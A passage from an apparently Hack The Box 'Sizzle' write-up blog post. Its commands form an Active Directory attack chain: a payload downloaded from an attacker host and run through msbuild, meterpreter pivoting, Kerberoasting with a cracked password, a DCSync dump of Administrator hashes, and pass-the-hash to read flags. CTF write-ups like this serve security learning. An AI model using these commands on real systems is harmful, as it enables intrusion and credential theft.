</span></span></code></pre></div><p>Upload the malicious binary and run it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; Invoke-WebRequest -URI http://10.10.14.52:800/rev.xml -OutFile rev.xml
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># run with msbuild.exe</span>
</span></span><span class="line"><span class="cl">&gt; C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework<span class="se">\v</span>4.0.30319<span class="se">\m</span>sbuild.exe rev.xml
</span></span></code></pre></div><p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled9_hu386183290466840222.png 330w,
        /img/sizzle/Untitled9_hu17111193501511284038.png 660w,
        /img/sizzle/Untitled9_hu17493620677322789144.png 1024w,
        /img/sizzle/Untitled9_hu12795699388138219825.png 2x"
        src="/img/sizzle/Untitled9_hu17111193501511284038.png"
        alt="Untitled"
      />
      
    </figure>
</p>


<h2 class="relative group"><strong>Exploit Kerberoasting :</strong> 
    <div id="exploit-kerberoasting-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#exploit-kerberoasting-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>With the meterpreter session i will be able to made pivoting with the meterpreter module and configure socks proxy.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># On msfconsole</span>
</span></span><span class="line"><span class="cl">&gt;  use server/socks_proxy
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; route add 10.10.10.0 255.255.255.0 &lt;SESSION_NUMBER&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; exploit
</span></span></code></pre></div><p>Your <strong><code>/etc/proxychains.conf</code></strong> file must point to port 1080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">socks5  127.0.0.1 <span class="m">1080</span>
</span></span></code></pre></div><p>Now we are able to run kerberoasting from linux with impacket tool.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; proxychains impacket-GetUserSPNs htb.local/amanda:<span class="s1">&#39;Ashare1972&#39;</span> -dc-ip 10.10.10.103 -request-user mrlky -target-domain htb.local -outputfile kerberos.txt
</span></span></code></pre></div><p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled10_hu7149237886184225266.png 330w,
        /img/sizzle/Untitled10_hu16263785847389211857.png 660w,
        /img/sizzle/Untitled10_hu1543207551167127240.png 1024w,
        /img/sizzle/Untitled10_hu15716671745198252680.png 2x"
        src="/img/sizzle/Untitled10_hu16263785847389211857.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>Crack the TGS with hashcat.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; hashcat -a <span class="m">0</span> -m <span class="m">13100</span> kerberos.txt /usr/share/wordlists/rockyou.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>mrlky<span class="nv">$HTB</span>.LOCAL<span class="nv">$htb</span>.local/mrlky*<span class="nv">$13</span>cf363d838f92b2f554ca7d39544dc6<span class="nv">$2</span>a295bf40a25aa1bc96fb72902c0d2ea6b9f75317fa775cf0eaf10ac623f2a707c0018c6686b04b8850bcb1552ad4de6a41da9760f103d4728e686124298703305e88766fe51b155d3f4c450597f6b18b5cd9d1104606ddb19d4ffec0c8c9fc604b60e31f0d8182f6662cf8827dd86fe98b47d83d92ce42018936eb77e8cd32fdcf5795071a93905b7770aa52a29a54f14518f74345105e6a063bb1ef0f89d7c62b39f74a2d6fff593550e34877bbf9a1eba1a38ce7c72a9cb08eea1fe91a7531055d8dac4986e0752e2a76c6e0253cf596b7f7c50e0d07c8cc998ed91183de78f8b952681ff9fb89907ffadce183e618e089e2f258a72bdde7e5accbeaa9816546eaed30e904b2016ef42662c5980517a841dd3d3a11e8d92a8095305e70d48af5e4cedc5e963e5baeceabd98dfd34453168f6608851c6a39dbcf374f76477d0755bb610435ccc2f52e99099ed03fbbf09e6aebdae9b69689330c2f401126cd22f682285759d822f30bb2c001173c3853196abfc84e4b98275024c21fb9217aaa121787b579748afa0f9e1b18a791f43abb8ea2c1e206350c42f9a380dc4a6db21cf3a6a28618936059b76908b385d7c86a4844146f60f3d9a6c3d3b91d27cfaa8e0dc74e6415018c01f20201890ace5185a1653f99524076f49386ade55fdcafad14739bd17a96ee66f691f4fe34cacbafdbae8fd288a4e49357fceefc0262b58992962eda76e3e86ece9afdaebf6c8e73e7e972978ac861a965cf878e6303a885fd894e2987422464307a17086763f22e21154b2f97a877c93adb875b81a5b04207b4a397504f4b880f2f20efe5bdcc3a2d98cd999179195a52805af350360c65d23f4f3d9ad805de29e084cc3387607690ee7526e0f20a53ffacd52a4e42cfbb4674dc2dbc83e0a8512f82f521b53d469a8b1b4879849b41e8667477a96e4befd5c5c31ed906ff1919c94291dd2a564fadd3a6a290ab8e8b86e71c1cc952e13ac6276a6750c5b36ebf08fce69b9f5231015e1c6fcf29a36b4aad2314fc127b5c8f7d65b026877765d3402dc04e44ffcf525c8a62f2e0b181533a7c1b77929ea237d0ee8d65e06ffa8eae5a3b5594fa166c3b80c86aa74bb28eb9a4f6009f12d33dcd877ff66eb702888b8cad7dc7b6c3581cf0b298f5fe1cb25bfae5309fa33eefaf5ad39c3366ef393ede1741c58a28adeb0551e07351a78bce638323793917610ef7fba33151455ed6e4f41ff76c47259ff69e9a4a:Football#7
</span></span></code></pre></div><p>valid the hash with CME.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; crackmapexec smb 10.10.10.103 -u mrlky -p <span class="s1">&#39;Football#7&#39;</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">14393</span> x64 <span class="o">(</span>name:SIZZLE<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         10.10.10.103    <span class="m">445</span>    SIZZLE           <span class="o">[</span>+<span class="o">]</span> HTB.LOCAL<span class="se">\m</span>rlky:Football#7 
</span></span></code></pre></div>

<h2 class="relative group"><strong>Dump domain hashs :</strong> 
    <div id="dump-domain-hashs-" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#dump-domain-hashs-" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>I look bloodhound to see what i can do with the user.</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /img/sizzle/Untitled11_hu15362289483217099974.png 330w,
        /img/sizzle/Untitled11_hu14076409459177034996.png 660w,
        /img/sizzle/Untitled11_hu3761408827384196314.png 1024w,
        /img/sizzle/Untitled11_hu9630058575522765254.png 2x"
        src="/img/sizzle/Untitled11_hu14076409459177034996.png"
        alt="Untitled"
      />
      
    </figure>
</p>
<p>This user has ACLs to dump domain hashes, especially to do DCsync thanks to replication ACLs.</p>
<p>We can do this with secretdump.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; impacket-secretsdump HTB.local/mrlky:<span class="s1">&#39;Football#7&#39;</span>@10.10.10.103 -target-ip 10.10.10.103 -just-dc-user Administrator
</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright <span class="m">2023</span> Fortra
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
</span></span><span class="line"><span class="cl">Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
</span></span><span class="line"><span class="cl">Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
</span></span><span class="line"><span class="cl">Administrator:des-cbc-md5:ad7afb706715e964
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up... 
</span></span></code></pre></div><p>Get the root hash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># user</span>
</span></span><span class="line"><span class="cl">crackmapexec smb 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x <span class="s1">&#39;more C:\Users\mrlky\Desktop\user.txt&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># root</span>
</span></span><span class="line"><span class="cl">&gt; crackmapexec smb 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 -x <span class="s1">&#39;more C:\Users\Administrator\Desktop\root.txt&#39;</span>
</span></span></code></pre></div><p>This machine was incredible, I learned new technique including bypass the closed kerberos port and be able to make a kerberoasting, soon ready for offshore. :)</p>

          
          
          
        </div>
        
        

        
        

          
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/sizzle.md"
        var oid_likes = "likes_posts\/sizzle.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/resolute/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >HTB-Resolute | OSCP Like</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-03-17T00:00:00&#43;00:00">17 March 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/cascade/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >HTB Cascade - Medium</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-07-08T00:00:00&#43;00:00">8 July 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      May the force be with you :D
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="http://0.0.0.0:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
